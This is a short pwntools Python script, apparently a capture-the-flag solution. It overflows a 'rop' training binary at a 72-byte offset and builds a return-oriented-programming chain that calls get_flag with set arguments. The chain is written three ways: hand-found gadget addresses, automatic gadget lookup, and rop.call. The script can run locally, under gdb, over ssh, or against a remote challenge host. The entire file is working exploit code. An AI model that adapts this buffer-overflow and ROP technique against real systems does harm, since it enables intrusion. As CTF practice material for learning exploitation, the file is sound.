#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './build/rop'

e = ELF('./build/rop')
rop = ROP('./build/rop')
if 'd' in sys.argv:
    p = gdb.debug('./build/rop')
elif 'r' in sys.argv:
    p = remote('forever.isss.io', 1306)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/overflow', cwd='problemDir')
else:
    p = process('./build/rop')

#simple
#found using ROPGadget --binary rop
#0x00000000004018ca : pop rdi ; ret
#0x000000000040f48e : pop rsi ; ret
#0x00000000004017cf : pop rdx ; ret
'''
chain = flat(0x4018ca,0x1337,0x40f48e,0xcafebabe,0x4017cf,0xdeadbeef,e.sym['get_flag'])
payload = flat({72:chain})
'''

#fancy
'''
rdi = rop.find_gadget(['pop rdi','ret'])[0]
rsi = rop.find_gadget(['pop rsi','ret'])[0]
rdx = rop.find_gadget(['pop rdx','ret'])[0]
chain = flat(rdi,0x1337,rsi,0xcafebabe,rdx,0xdeadbeef,e.sym['get_flag'])
payload = flat({72:chain})
'''

#fanciest
rop.call('get_flag', [0x1337,0xcafebabe, 0xdeadbeef])
print(rop.dump())
payload = flat({72: rop.chain()})

p.sendline(payload)
p.interactive()
